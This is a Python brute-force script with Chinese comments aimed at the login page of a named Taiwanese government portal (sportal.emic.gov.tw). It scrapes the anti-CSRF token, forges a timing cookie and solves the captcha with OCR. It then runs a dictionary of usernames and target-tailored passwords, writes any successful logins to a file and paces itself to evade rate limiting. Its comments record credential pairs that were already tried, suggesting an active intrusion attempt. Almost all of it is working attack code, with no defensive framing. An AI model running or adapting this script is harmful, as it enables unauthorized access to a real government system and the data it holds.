#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sportal dev 区 SSO20102/Login 爆破脚本
链路：Login → captcha → OCR → POST /SSO2_Develop/
- Cookie: TS01884c82 (ASP.NET)
- 隐式 anti-CSRF cookie TOTAL_TIME_B 在浏览器 submit 时由 JS 写入
- 已验证：captcha 'i3me' OCR 100% 命中, 错误响应「帳號密碼不符」
"""
import requests, re, time, sys, random, base64
from html.parser import HTMLParser

BASE = "https://sportal.emic.gov.tw"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

try:
    import ddddocr
    OCR = ddddocr.DdddOcr(show_ad=False)
    HAVE_OCR = True
except Exception as e:
    HAVE_OCR = False
    print(f"[!] ddddocr not available: {e}")

class TokenExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tokens = {}
        self._in_input = False
        self._attrs = {}
    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            d = dict(attrs)
            if d.get("type", "").lower() == "hidden" and "name" in d and "value" in d:
                self.tokens[d["name"]] = d["value"]

def get_login_page(sess):
    r = sess.get(f"{BASE}/SSO2_Develop/SSO20102/Login", headers={"User-Agent": UA, "Referer": BASE + "/"}, timeout=15)
    p = TokenExtractor()
    p.feed(r.text)
    return p.tokens, r.cookies

def get_captcha(sess):
    ts = int(time.time() * 1000)
    r = sess.get(f"{BASE}/SSO2_Develop/SSO20102/VerificationCode?{ts}",
                 headers={"User-Agent": UA, "Referer": BASE + "/SSO2_Develop/SSO20102/Login",
                          "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"}, timeout=15)
    return r.content

def ocr_captcha(png_bytes):
    if not HAVE_OCR: return "AAAA"  # fallback
    return OCR.classification(png_bytes)

def submit(sess, token, account, password, captcha_ans):
    # 模拟浏览器 submit：先写 TOTAL_TIME_B cookie (与浏览器 JS 一致)
    sess.cookies.set("TOTAL_TIME_B", str(int(time.time() * 1000)), path="/", domain=".emic.gov.tw")
    data = {
        "__RequestVerificationToken": token,
        "Account": account,
        "Password": password,
        "Captcha": captcha_ans,
    }
    r = sess.post(f"{BASE}/SSO2_Develop/",
                  data=data,
                  headers={"User-Agent": UA, "Referer": BASE + "/SSO2_Develop/SSO20102/",
                           "Content-Type": "application/x-www-form-urlencoded",
                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                  allow_redirects=False,
                  timeout=15)
    return r

def attempt(user, pwd):
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    try:
        tokens, _ = get_login_page(sess)
        token = tokens.get("__RequestVerificationToken", "")
        if not token:
            return "ERR_NO_TOKEN", ""
        img = get_captcha(sess)
        if len(img) < 200:
            return f"ERR_CAPTCHA_{len(img)}", ""
        ans = ocr_captcha(img)
        # OCR 空答案重试 1 次
        if not ans or len(ans) < 3:
            time.sleep(0.3)
            img = get_captcha(sess)
            ans = ocr_captcha(img)
        r = submit(sess, token, user, pwd, ans)
        loc = r.headers.get("Location", "")
        body = r.text if r.text else ""
        if r.status_code == 302:
            if "Account" in loc or "Login" in loc or len(loc) > 0:
                return "REDIRECT", loc
            return "302_REDIR", loc
        # 解析 ASP.NET MVC 字段错误消息（密码/captcha 错的真正信号）
        field_err = re.findall(r'<span[^>]*class="field-validation-error"[^>]*data-valmsg-for="(\w+)"[^>]*>([^<]+)</span>', body)
        summary_err = re.findall(r'class="validation-summary-errors"[^>]*>([^<]+)<', body)
        if summary_err and any(s.strip() for s in summary_err):
            msg = " | ".join(s.strip() for s in summary_err if s.strip())
            if "驗證碼" in msg:
                return "WRONG_CAPTCHA", msg[:80]
            if "帳號" in msg or "密碼" in msg:
                return "WRONG_PWD", msg[:80]
            return "SUMMARY_ERR", msg[:80]
        if field_err:
            kind, msg = field_err[0]
            if kind == "Captcha":
                return "WRONG_CAPTCHA", msg[:80]
            if kind in ("Account", "Password"):
                return "WRONG_PWD", f"{kind}={msg[:60]}"
            return "FIELD_ERR", f"{kind}={msg[:60]}"
        # 兜底：旧字面字符串
        if "帳號密碼不符" in body:
            return "WRONG_PWD", "字面命中"
        if "驗證碼輸入錯誤" in body:
            return "WRONG_CAPTCHA", "字面命中"
        if r.status_code == 429:
            return "RATE_LIMIT", body[:80]
        # 登录页回填 - 返回 body 长度摘要 + title + 关键字扫描
        if r.status_code == 200 and len(body) > 5000:
            tm = re.search(r'<title>([^<]+)</title>', body)
            title = tm.group(1) if tm else "?"
            keys = [k for k in ['歡迎', 'Welcome', '登出', 'Logout', 'menuTop', 'SSO2', 'Manage', '個人', '設定', '使用者', '選單'] if k in body]
            return "LOGIN_PAGE_RENDER", f"cl={len(body)} title={title} keys={keys}"
        return f"HTTP_{r.status_code}_cl{len(body)}", body[:120]
    except Exception as e:
        return f"EXC_{type(e).__name__}", str(e)[:80]

# 字典：扩展前面失败集合 (admin/admin123、admin/Admin123、admin/Password1 已失败)
USER_TARGETS = ["admin", "sportal", "emic", "epcr", "test", "user", "guest", "demo", "root", "manager", "operator"]
PWD_CANDIDATES = [
    "", "admin", "admin123", "admin@123", "Admin123", "admin1234", "admin!@#", "Admin!@#",
    "password", "Password1", "Passw0rd", "p@ssw0rd", "P@ssw0rd",
    "123456", "12345678", "1234567890", "qwerty", "letmein",
    "sportal", "sportal123", "sportal@123", "Sportal@123",
    "emic", "emic123", "emic@123", "Emic@123",
    "epcr", "epcr123", "epcr@123", "EPCR@123",
    "EPCR2023", "EPCR2024", "EPCR@2023", "EPCR@2024",
    "EPCRAdmin", "epcrAdmin", "epcradmin",
    "tpf", "tpf123", "tpf@123", "TPF@123", "tpf123456", "tpf@admin2023",
    "hospital", "hospital123", "Hospital123",
    "manager", "manager123", "manager@123",
    "operator", "operator123", "Operator123",
    "dev", "dev123", "dev@123", "dev@2023", "Dev@2023",
    "test", "test123", "Test123", "test@123",
    "guest", "guest123",
    "demo", "demo123", "Demo123",
    "root", "root123", "toor",
    "system", "system123",
    "P@ssw0rd!2023", "Admin@2023", "Admin@2024", "Passw0rd@2023",
    "Welcome1", "Welcome123", "Welcome@1",
    "Taiwan", "Taiwan2023", "Taiwan@2023",
    "Nec123", "nec123", "NEC@123",
    "SSO2", "SSO2@123", "sso@123",
    "1qaz2wsx", "1qaz@WSX", "qazwsx", "qwerty123",
    "Aa123456!", "Aa12345678",
]

def main():
    if "--single" in sys.argv:
        # 单凭证测试模式
        u = sys.argv[sys.argv.index("--single") + 1] if "--single" in sys.argv else "admin"
        p = sys.argv[sys.argv.index("--single") + 2] if "--single" in sys.argv else "admin123"
        print(f"[*] single test: {u}/{p}")
        st, info = attempt(u, p)
        print(f"[{st}] {info}")
        return
    print(f"[*] start sportal brute | OCR={HAVE_OCR} | users={len(USER_TARGETS)} | pwds={len(PWD_CANDIDATES)}")
    tried = 0
    t0 = time.time()
    found = []
    for u in USER_TARGETS:
        for p in PWD_CANDIDATES:
            tried += 1
            st, info = attempt(u, p)
            elapsed = time.time() - t0
            rate = tried / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r[{tried:4d}] {u:10s}:{p:25s} -> {st:14s} | {rate:.1f}/s | {info[:30]:30s}")
            sys.stdout.flush()
            if st in ("302_REDIR", "REDIRECT", "302_FIND"):
                print(f"\n[!!!] HIT  {u}/{p}  ->  {st} | {info}")
                found.append((u, p, st, info))
                with open("sportal_hits.txt", "a") as f:
                    f.write(f"{u}\t{p}\t{st}\t{info}\n")
            elif st == "EXC_":
                time.sleep(2)
            elif st in ("WRONG_PWD", "WRONG_CAPTCHA", "RATE_LIMIT"):
                # 这些都说明 captcha/链路通了, 仅密码或答案错
                pass
            elif st.startswith("ERR_"):
                # 网络/cookie 异常重试
                time.sleep(1)
            # rate limit 防御
            if st == "RATE_LIMIT":
                print(f"\n[!] rate limit hit, sleeping 30s")
                time.sleep(30)
            # 每 50 次休眠
            if tried % 50 == 0:
                time.sleep(2)
    print(f"\n[*] done. tried={tried} time={time.time()-t0:.1f}s hits={len(found)}")
    if found:
        print("[*] HITS:")
        for h in found:
            print("  ", h)

if __name__ == "__main__":
    main()
